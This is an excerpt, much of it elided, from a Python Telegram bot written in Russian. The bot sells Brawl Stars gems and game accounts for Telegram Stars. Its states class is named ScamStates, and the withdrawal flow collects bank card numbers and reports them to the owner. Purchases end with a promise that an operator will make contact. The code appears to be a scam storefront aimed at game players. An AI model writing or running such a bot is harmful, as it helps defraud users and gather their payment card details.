...
async def process_withdraw_card(message: Message, state: FSMContext):
    ...
    log_action(
        message.from_user,
        f"ВЫВЕЛ {amount} ⭐ на карту {card_number[:4]}...{card_number[-4:]} (остаток {new_balance})"
    )
    await notify_owner(
        message.from_user,
        f"💸 <b>ВЫВОД СРЕДСТВ</b>\n"
...
async def process_donate_buy(callback: CallbackQuery, state: FSMContext):
    ...
    if balance < final_price:
        ...
        await callback.message.answer(
            f"❌ <b>Недостаточно средств!</b>\n\n"
            f"Для покупки <b>{target_item['name']}</b> требуется <b>{final_price} ⭐</b>, а у вас <b>{balance} ⭐</b>.\n"
    ...
    await callback.message.answer(
        f"✅ <b>Отлично!</b>\n\n"
        f"Вы успешно приобрели <b>{target_item['name']}</b> за {final_price} ⭐.\n"
...
async def handle_gems_amount(message: Message, state: FSMContext):
    ...
    if balance < final_price:
        await message.answer(
            f"❌ <b>Недостаточно средств!</b>\n\n"
            f"Для покупки <b>{gems_count} гемов</b> требуется <b>{final_price} ⭐</b>, а у вас <b>{balance} ⭐</b>.\n"
            "Пополните баланс через поддержку: @suport_skup_bs_bot\n"
            "или воспользуйтесь кнопкой «Поддержка» в главном меню бота.",
            reply_markup=back_to_main_kb, parse_mode="HTML"
        )
    ...
    await message.answer(
        f"✅ <b>Отлично!</b>\n\n"
        f"Вы успешно приобрели <b>{gems_count} гемов</b> за {final_price} ⭐.\n"
        f"📊 Новый баланс: {new_balance} ⭐\n\n"
        f"Скоро с вами свяжется наш оператор.\n"
        f"Спасибо за покупку! 🎉\n"
        f"По всем вопросам обращайтесь в поддержку: @suport_skup_bs_bot\n"
...
async def process_buy_lot(callback: CallbackQuery, state: FSMContext):
    ...
    if balance < final_price:
        ...
        await callback.message.answer(
            f"❌ <b>Недостаточно средств!</b>\n\n"
            f"Для покупки лота требуется <b>{final_price} ⭐</b>, а у вас на балансе <b>{balance} ⭐</b>.\n"
            "Пополните баланс через поддержку: @suport_skup_bs_bot\n"
            "или воспользуйтесь кнопкой «Поддержка» в главном меню бота.",
            parse_mode="HTML"
        )
    ...
    await callback.message.answer(
        f"✅ <b>Отлично!</b>\n\n"
        f"Вы успешно купили <b>{lot['name']}</b> за {final_price} ⭐.\n"
...
async def admin_password_check(message: Message, state: FSMContext):
    ...
    if message.text == "🔙 Назад":
        ...
        if message.from_user.id == OWNER_USERNAME:
            ...
            await message.answer("❓ <b>Что вы хотите сделать?</b>", reply_markup=main_menu_kb, parse_mode="HTML")
        return
    if message.text == ADMIN_PASSWORD or message.text == SUPPORT_PASSWORD:
        await message.answer(
            "✅ <b>Пароль верный!</b>\n\n"
            "👑 <b>Админ-панель</b>\n\n"
            "Выберите действие:",
...
async def process_new_lot_number(message: Message, state: FSMContext):
    ...
    try:
        ...
        await message.answer(
            "❌ Введите положительное целое число (например, 8).\n"
            "Попробуйте ещё раз или нажмите 'Назад'.",
            reply_markup=back_to_main_kb, parse_mode="HTML"
        )
        return
...
async def process_new_lot_cups(message: Message, state: FSMContext):
    ...
    if not cups:
        await message.answer(
            "❌ Количество кубков не может быть пустым.\n"
            "Попробуйте ещё раз или нажмите 'Назад'.",
            reply_markup=back_to_main_kb, parse_mode="HTML"
        )
        return
...
async def process_new_lot_fighters(message: Message, state: FSMContext):
    ...
    try:
        ...
        await message.answer(
            "❌ Введите положительное целое число (количество бойцов).\n"
            "Попробуйте ещё раз или нажмите 'Назад'.",
            reply_markup=back_to_main_kb, parse_mode="HTML"
        )
        return
...
async def process_new_lot_gems(message: Message, state: FSMContext):
    ...
    try:
        ...
        await message.answer(
            "❌ Введите неотрицательное целое число (количество гемов).\n"
            "Попробуйте ещё раз или нажмите 'Назад'.",
            reply_markup=back_to_main_kb, parse_mode="HTML"
        )
        return
...
async def process_new_lot_price(message: Message, state: FSMContext):
    ...
    try:
        ...
        await message.answer(
            "❌ Введите положительное целое число (цену в звёздах).\n"
            "Попробуйте ещё раз или нажмите 'Назад'.",
            reply_markup=back_to_main_kb, parse_mode="HTML"
        )
        return
    ...
    log_action(
        message.from_user,
        f"СОЗДАЛ/ОБНОВИЛ ЛОТ {lot_name}: кубки={cups}, бойцы={fighters}, гемы={gems}, цена={price}"
    )
...
async def catch_all_messages(message: Message, state: FSMContext):
    ...
    if current_state == ScamStates.waiting_gems_amount:
        await message.answer(
            "💎 <b>Пожалуйста, введите число</b> — количество гемов.\n\n"
            "Например: 10, 50, 100.\n\n"
            "🔙 Чтобы вернуться в меню доната — нажмите 'Назад'.",
            reply_markup=back_to_main_kb, parse_mode="HTML"
        )
    elif current_state == ScamStates.waiting_support:
        await message.answer(
            "📩 Пожалуйста, отправьте <b>текстовое сообщение</b> с вашим вопросом.\n\n"
            "🔙 Или нажмите 'Назад' для отмены.",
            reply_markup=support_kb, parse_mode="HTML"
        )
    elif current_state == ScamStates.waiting_withdraw_amount:
        await message.answer(
            "💰 Введите сумму вывода (целое число) или нажмите 'Назад'.",
            reply_markup=back_to_main_kb
        )
    elif current_state == ScamStates.waiting_withdraw_card:
        await message.answer(
            "💳 Введите номер карты (только цифры) или нажмите 'Назад'.",
            reply_markup=back_to_main_kb
        )
    else:
        await message.answer(
...
async def main():
    print("🤖 Бот запущен (без оптимизации)")
